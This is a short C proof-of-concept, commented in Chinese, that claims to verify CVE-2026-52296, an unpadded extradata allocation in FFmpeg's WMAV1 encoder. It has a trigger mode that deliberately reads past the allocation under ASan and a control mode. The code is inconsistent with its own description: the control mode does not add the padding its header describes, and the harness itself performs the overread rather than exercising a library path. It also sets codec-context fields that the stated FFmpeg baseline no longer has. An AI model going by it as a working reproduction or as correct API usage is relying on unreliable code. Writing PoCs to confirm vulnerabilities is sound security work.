/*
 * CVE-2026-52296 运行验证 PoC — third_party/ffmpeg wmaenc extradata 缺填充
 *
 * 缺陷：wmaenc.c encode_init 为 extradata 分配 av_malloc(4)/av_mallocz(10)
 * 不带 AV_INPUT_BUFFER_PADDING_SIZE → 下游按填充约定块读 extradata 越界读。
 * 上游修复：FFmpeg 23227a44 (2026-05-03) 补齐填充。
 * 等价性：OH third_party_ffmpeg(0a0c4dd33c, 基线 n7.1.1) 与上游逐字节一致。
 *
 * 用法：./poc_wmaenc trigger|control
 *   trigger: WMAV1 编码初始化后在消费侧以 64 位块读 extradata → ASan 越界读
 *   control: 手动附加 PADDING 后读取 → 正常
 */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#include <libavcodec/avcodec.h>
#include <libavutil/mem.h>
#include <libavutil/opt.h>

int main(int argc, char **argv)
{
    if (argc != 2) { fprintf(stderr, "Usage: %s trigger|control\n", argv[0]); return 1; }
    int is_trigger = strcmp(argv[1], "trigger") == 0;

    const AVCodec *codec = avcodec_find_encoder(AV_CODEC_ID_WMAV1);
    if (!codec) { fprintf(stderr, "WMAV1 encoder not found\n"); return 2; }
    AVCodecContext *ctx = avcodec_alloc_context3(codec);
    if (!ctx) return 3;

    ctx->sample_rate = 44100;
    ctx->channels = 2;
    ctx->channel_layout = AV_CH_LAYOUT_STEREO;
    ctx->sample_fmt = AV_SAMPLE_FMT_S16;
    ctx->bit_rate = 128000;
    ctx->block_align = 0; /* let encoder compute */

    if (avcodec_open2(ctx, codec, NULL) < 0) {
        fprintf(stderr, "avcodec_open2 failed\n"); return 4;
    }

    fprintf(stdout, "extradata_size=%d\n", ctx->extradata_size);

    if (is_trigger) {
        /* 模拟下游按 FFmpeg 约定以 64 位块读 extradata（ff_wma_init 等路径）。
         * extradata 分配为 4 字节不带填充 → 读第 4-7 字节时越界 */
        fprintf(stdout, "reading extradata beyond allocation...\n");
        uint64_t val;
        memcpy(&val, ctx->extradata + 4, 8); /* read bytes 4-11: past 4-byte alloc */
        fprintf(stdout, "read value: %016llx\n", (unsigned long long)val);
    } else {
        /* Control: 只读合法范围内的数据 */
        uint32_t val;
        memcpy(&val, ctx->extradata, 4);
        fprintf(stdout, "in-bounds read: %08x\n", val);
    }

    avcodec_free_context(&ctx);
    fprintf(stderr, "=== %s: completed ===\n", is_trigger ? "trigger" : "control");
    return 0;
}
